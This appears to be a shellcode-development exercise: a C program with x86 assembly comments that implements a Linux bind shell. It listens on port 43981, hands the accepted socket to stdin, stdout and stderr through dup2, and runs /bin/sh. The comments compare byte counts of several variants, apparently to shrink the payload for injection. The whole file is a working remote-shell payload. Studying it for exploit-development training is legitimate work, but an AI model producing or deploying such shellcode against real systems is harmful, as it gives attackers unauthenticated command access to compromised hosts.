/*
this version contains equivalent assembly instructions, using the
socketcall(2) system call throughout

heavily borrowed instruction choices from
http://programming4.us/security/704.aspx
*/

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(int argc, char *argv[])
{
    int srv_sockfd, clnt_sockfd;
    int srv_port = 43981; // set server port; 43981d = ABCDh
    struct sockaddr_in srv_addr;

    /* setup
global _start
section .text
_start:
    xor eax, eax
    cdq              ; clear edx
    xchg ebx, eax
    xor ecx, ecx
    xor edx, edx
    */

    srv_sockfd = socket(AF_INET, SOCK_STREAM, 0);
    /*
    push byte 0x66   ; socketcall(2) <linux/net.h>
    pop eax
    inc ebx          ; socket(2) [1]
    push edx         ; arg3 :: protocol    = 0
    push byte 0x1    ; arg2 :: SOCK_STREAM = 1 <sys/socket.h>
    push byte 0x2    ; arg1 :: AF_INET     = 2 <sys/socket.h> 
    mov ecx, esp
    int 0x80
    xchg esi, eax    ; srv_sockfd moved from eax to esi
    */

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_port = htons(srv_port);
    srv_addr.sin_addr.s_addr = INADDR_ANY;
    bind(srv_sockfd, (struct sockaddr *) &srv_addr, sizeof(srv_addr));
    /*
    push byte 0x66   ; socketcall(2)
    pop eax
    inc ebx          ; bind(2) [2]
                     ; build sockaddr_in struct
    push edx         ; INADDR_ANY = 0     <netinet/in.h>
    push word 0xCDAB ; PORT       = 43981
    push word bx     ; AF_INET    = 2     <sys/socket.h>
    mov ecx, esp     ; pointer to sockaddr_in struct
    push byte 0x10   ; arg3 :: size of struct = word + word + dword = 16
    push ecx         ; arg2 :: pointter to sockaddr_in struct
    push esi         ; arg1 :: srv_sockfd
    mov ecx, esp
    int 0x80
    */

    // best practice: backlog (2nd arg) should be at least 5;
    // 4 is a good compromise because ebx is 4 at this point
    listen(srv_sockfd, 4);
    /*
    ; [eax is necessarily zero here; verified via GDB]
    mov al, 0x66     ; socketcall(2)
    inc ebx
    inc ebx          ; listen(2) [4]
    push edx         ; arg2 :: protocol = 0
    push esi         ; arg1 :: srv_sockfd
    mov ecx, esp
    int 0x80
    */

    // addr and addrlen set to NULL b/c control will
    // handed over to the shell via dup2 and execve calls
    clnt_sockfd = accept(srv_sockfd, NULL, NULL);
    /*
    ; [eax is necessarily zero here; verified via GDB]
    mov al, 0x66     ; socketcall(2)
    inc ebx          ; accept(2) [5]
    push edx         ; arg3 :: addrlen = NULL
    push edx         ; arg2 :: addr    = NULL
    push esi         ; arg1 :: srv_sockfd
    mov ecx, esp
    int 0x80
    */

    dup2(clnt_sockfd, 0);
    dup2(clnt_sockfd, 1);
    dup2(clnt_sockfd, 2);
    // stderr can always be redirected to stdout, so let's
    // try it w/out... here are the byte counts, btw...
    /*
    ---- without loop; all three FDs; 19 bytes ----
    mov ebx, eax     ; arg1 :: clnt_sockfd (for dup2)
    push byte 0x3F   ; dup2(2)
    pop eax
    xor ecx, ecx     ; arg2 :: stdin = 0
    int 0x80
    mov al, 0x3F     ; dup2(2)
    inc ecx          ; arg2 :: stdout = 1
    int 0x80
    mov al, 0x3F     ; dup2(2)
    inc ecx          ; arg2 :: stderr = 2
    int 0x80
    ---- without loop; only first two FDs; 14 bytes ----
    mov ebx, eax     ; arg1 :: clnt_sockfd (for dup2)
    push byte 0x3F   ; dup2(2)
    pop eax
    xor ecx, ecx     ; arg2 :: stdin = 0
    int 0x80
    mov al, 0x3F     ; dup2(2)
    inc ecx          ; arg2 :: stdout = 1
    int 0x80
    ---- with loop; all three FDs; 16 bytes ----
    mov ebx, eax     ; arg1 :: clnt_sockfd (for dup2)
    xor eax, eax
    xor ecx, ecx     ; arg2 :: stdin [0]
dup2loop:
    mov al, 0x3F     ; dup2(2)
    int 0x80
    inc ecx          ; arg2 :: stdout [1] & stderr [2]
    cmp byte cl, 0x2
    jle dup2loop
    ---- with loop (xchg/jns tricks); all three FDs; 11 bytes ----
    xchg eax, ebx    ; arg1 in ebx; 0x5 (32-bits) in eax
    push 0x2
    pop ecx          ; loop from 2 to 0
dup2loop:
    mov byte al, 0x3F ; dup2(2)
    int 0x80
    dec ecx
    jns dup2loop      ; loop ends when ecx == -1
    */

    execve("/bin/sh", NULL, NULL);
    /*
    xor eax, eax
    mov byte al, 0x0B ; execve(2)
    push edx          ; null terminator
    push 0x68732f2f   ; "hs//"
    push 0x6e69622f   ; "nib/"
    mov ebx, esp      ; arg1 :: "/bin/sh\0"
    push edx          ; null terminator
    mov edx, esp      ; arg3 :: envp = NULL array
    push ebx
    mov ecx, esp      ; arg2 :: argv array (ptr to string)
    int 0x80
    */
    return 0;
}
